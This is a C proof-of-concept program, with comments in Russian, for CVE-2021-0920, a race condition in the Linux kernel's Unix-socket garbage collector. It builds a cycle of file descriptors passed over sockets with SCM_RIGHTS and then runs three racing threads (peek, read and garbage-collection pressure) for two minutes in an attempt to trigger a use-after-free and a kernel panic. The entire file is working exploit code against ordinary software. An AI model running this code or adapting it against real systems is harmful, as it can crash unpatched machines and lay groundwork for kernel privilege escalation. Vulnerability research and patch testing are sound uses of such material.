#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <stdbool.h>

// Структура для передачи fd
void send_fd(int socket, int fd) {
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));
    sendmsg(socket, &msg, 0);
}

// Функция для получения fd
int recv_fd(int socket, int flags) {
    struct msghdr msg = {0};
    char buf[1];
    struct iovec io = { .iov_base = buf, .iov_len = sizeof(buf) };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);
    if (recvmsg(socket, &msg, flags) < 0) return -1;
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg && cmsg->cmsg_type == SCM_RIGHTS) {
        int fd;
        memcpy(&fd, CMSG_DATA(cmsg), sizeof(int));
        return fd;
    }
    return -1;
}

int R[2], B[2], C[2], D[2]; // Наши сокеты
volatile bool stop = false;

// Поток 1: Выполняет MSG_PEEK, чтобы получить B и C
void* peek_thread(void* arg) {
    while (!stop) {
        int b_fd = recv_fd(R[1], MSG_PEEK); // PEEK(R) -> B
        if (b_fd >= 0) {
            int c_fd = recv_fd(b_fd, MSG_PEEK); // PEEK(B) -> C
            if (c_fd >= 0) {
                close(c_fd);
            }
            close(b_fd);
        }
    }
    return NULL;
}

// Поток 2: Делает обычное чтение B, чтобы очистить UNIXCB
void* read_thread(void* arg) {
    while (!stop) {
        // Обычное чтение B (снимает ссылки и может застрять на unix_gc_lock)
        // Мы не проверяем результат, просто вызываем
        recv_fd(B[1], 0);
    }
    return NULL;
}

// Поток 3: Триггерит GC (закрытие файлов и создание нагрузки)
void* gc_thread(void* arg) {
    while (!stop) {
        // Создаём нагрузку на GC: много сокетов с циклами
        for (int i = 0; i < 50; i++) {
            int t1[2], t2[2];
            if (socketpair(AF_UNIX, SOCK_STREAM, 0, t1) == 0 && 
                socketpair(AF_UNIX, SOCK_STREAM, 0, t2) == 0) {
                send_fd(t1[0], t2[0]);
                send_fd(t2[0], t1[0]);
                close(t1[0]); close(t2[0]);
                // t1[1], t2[1] оставляем открытыми, чтобы держать цикл
            }
        }
        usleep(1000); // небольшая пауза, чтобы не убить систему
    }
    return NULL;
}

int main() {
    printf("[*] CVE-2021-0920 Race PoC v3 (Graph-based)\n");

    // 1. Создаём сокеты: R, B, C, D
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, R) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, B) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, C) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, D) < 0) {
        perror("socketpair");
        return 1;
    }

    // 2. Строим граф: R -> B -> C -> D -> C
    send_fd(R[0], B[0]);
    send_fd(B[0], C[0]);
    send_fd(C[0], D[0]);
    send_fd(D[0], C[0]); // Цикл D -> C

    // 3. Закрываем исходные дескрипторы
    close(R[0]); close(B[0]); close(C[0]); close(D[0]);

    printf("[+] Graph created and original fds closed.\n");
    printf("[*] Racing (3 threads)...\n");

    // 4. Запускаем три потока
    pthread_t t1, t2, t3;
    pthread_create(&t1, NULL, peek_thread, NULL);
    pthread_create(&t2, NULL, read_thread, NULL);
    pthread_create(&t3, NULL, gc_thread, NULL);

    // 5. Ждём (например, 120 секунд, чтобы дать больше шансов)
    sleep(120);

    stop = true;
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    pthread_join(t3, NULL);

    printf("[-] PoC finished without panic.\n");
    return 0;
}